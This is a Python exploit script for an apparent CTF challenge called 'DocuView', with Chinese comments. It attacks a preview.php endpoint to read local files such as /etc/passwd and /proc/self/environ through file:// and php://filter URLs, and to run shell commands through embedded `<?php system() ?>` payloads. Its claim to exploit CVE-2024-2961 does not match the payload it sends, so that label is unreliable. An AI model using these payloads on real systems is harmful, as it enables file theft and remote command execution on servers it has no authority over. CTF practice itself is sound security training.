#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DocuView CTF Challenge - Simple Flag Extractor
Quick exploit for CVE-2024-2961 via SSRF

Usage: python3 simple_exp_docuview.py <target_url>
Example: python3 simple_exp_docuview.py http://localhost:8080
"""

import requests
import sys
import base64
import re

def extract_flag(target_url):
    """快速提取flag的函数"""
    target_url = target_url.rstrip('/')
    
    print(f"[*] Targeting: {target_url}")
    print("[*] Attempting to extract flag...\n")
    
    # 常见的flag位置
    flag_paths = [
        "/flag",
        "/root/flag", 
        "/home/flag",
        "/var/www/html/flag",
        "/tmp/flag",
        "/flag.txt"
    ]
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    for path in flag_paths:
        print(f"[*] Trying: {path}")
        
        # 方法1: 直接文件读取
        try:
            data = {
                'url': f'file://{path}',
                'format': 'text',
                'quality': 'high',
                'cache': 'false'
            }
            
            response = session.post(f"{target_url}/preview.php", data=data, timeout=10)
            
            if response.status_code == 200 and response.text.strip():
                content = response.text.strip()
                if 'flag{' in content.lower() or 'ctf{' in content.lower():
                    print(f"[+] FLAG FOUND: {content}")
                    return content
        except:
            pass
        
        # 方法2: Base64编码读取
        try:
            data = {
                'url': f'php://filter/convert.base64-encode/resource={path}',
                'format': 'text', 
                'quality': 'high',
                'cache': 'false'
            }
            
            response = session.post(f"{target_url}/preview.php", data=data, timeout=10)
            
            if response.status_code == 200 and response.text.strip():
                try:
                    decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
                    if 'flag{' in decoded.lower() or 'ctf{' in decoded.lower():
                        print(f"[+] FLAG FOUND (base64): {decoded}")
                        return decoded
                except:
                    pass
        except:
            pass
    
    # 方法3: 尝试通过环境变量
    print("[*] Trying environment variables...")
    try:
        data = {
            'url': 'php://filter/convert.base64-encode/resource=/proc/self/environ',
            'format': 'text',
            'quality': 'high', 
            'cache': 'false'
        }
        
        response = session.post(f"{target_url}/preview.php", data=data, timeout=10)
        
        if response.status_code == 200 and response.text.strip():
            try:
                decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
                # 查找FLAG环境变量
                flag_match = re.search(r'FLAG=([^\x00]+)', decoded)
                if flag_match:
                    flag = flag_match.group(1)
                    print(f"[+] FLAG FOUND in environment: {flag}")
                    return flag
            except:
                pass
    except:
        pass
    
    # 方法4: 尝试执行readflag程序
    print("[*] Trying readflag program...")
    readflag_paths = ["/readflag", "/bin/readflag", "/usr/bin/readflag"]
    
    for readflag_path in readflag_paths:
        try:
            # 使用CVE-2024-2961载荷执行readflag
            command = readflag_path
            payload = f"php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-decode/resource=data://text/plain;base64,{base64.b64encode(f'<?php system("{command}"); ?>'.encode()).decode()}"
            
            data = {
                'url': payload,
                'format': 'text',
                'quality': 'high',
                'cache': 'false'
            }
            
            response = session.post(f"{target_url}/preview.php", data=data, timeout=10)
            
            if response.status_code == 200 and response.text.strip():
                content = response.text.strip()
                if 'flag{' in content.lower() or 'ctf{' in content.lower():
                    print(f"[+] FLAG FOUND via {readflag_path}: {content}")
                    return content
        except:
            pass
    
    # 方法5: 尝试简单的命令执行获取flag
    print("[*] Trying command execution...")
    commands = [
        "cat /flag",
        "cat /root/flag", 
        "find / -name '*flag*' -type f 2>/dev/null | head -5 | xargs cat",
        "env | grep -i flag"
    ]
    
    for cmd in commands:
        try:
            payload = f"php://filter/convert.base64-decode/resource=data://text/plain;base64,{base64.b64encode(f'<?php system("{cmd}"); ?>'.encode()).decode()}"
            
            data = {
                'url': payload,
                'format': 'text',
                'quality': 'high',
                'cache': 'false'
            }
            
            response = session.post(f"{target_url}/preview.php", data=data, timeout=10)
            
            if response.status_code == 200 and response.text.strip():
                content = response.text.strip()
                if 'flag{' in content.lower() or 'ctf{' in content.lower():
                    print(f"[+] FLAG FOUND via command '{cmd}': {content}")
                    return content
        except:
            pass
    
    print("[-] Flag not found with any method")
    return None

def test_vulnerability(target_url):
    """测试漏洞是否存在"""
    target_url = target_url.rstrip('/')
    
    print("[*] Testing SSRF vulnerability...")
    
    try:
        session = requests.Session()
        
        # 测试基本的文件读取
        data = {
            'url': 'file:///etc/passwd',
            'format': 'text',
            'quality': 'high',
            'cache': 'false'
        }
        
        response = session.post(f"{target_url}/preview.php", data=data, timeout=10)
        
        if response.status_code == 200 and ('root:' in response.text or 'bin/' in response.text):
            print("[+] SSRF vulnerability confirmed!")
            return True
        else:
            print("[!] SSRF vulnerability not confirmed, but continuing...")
            return False
            
    except Exception as e:
        print(f"[-] Error testing vulnerability: {e}")
        return False

def main():
    if len(sys.argv) != 2:
        print("DocuView CTF Challenge - Simple Flag Extractor")
        print("Usage: python3 simple_exp_docuview.py <target_url>")
        print("Example: python3 simple_exp_docuview.py http://localhost:8080")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    print("="*50)
    print("  DocuView Simple Flag Extractor")
    print("  CVE-2024-2961 via SSRF")
    print("="*50)
    
    # 测试漏洞
    test_vulnerability(target_url)
    
    # 提取flag
    flag = extract_flag(target_url)
    
    if flag:
        print(f"\n[SUCCESS] Flag extracted: {flag}")
        sys.exit(0)
    else:
        print("\n[FAILED] Could not extract flag")
        print("\nTroubleshooting tips:")
        print("1. Make sure the target is running DocuView")
        print("2. Check if the target URL is correct")
        print("3. Verify the flag file exists on the target system")
        print("4. Try the full exploit script: exp_docuview.py")
        sys.exit(1)

if __name__ == "__main__":
    main()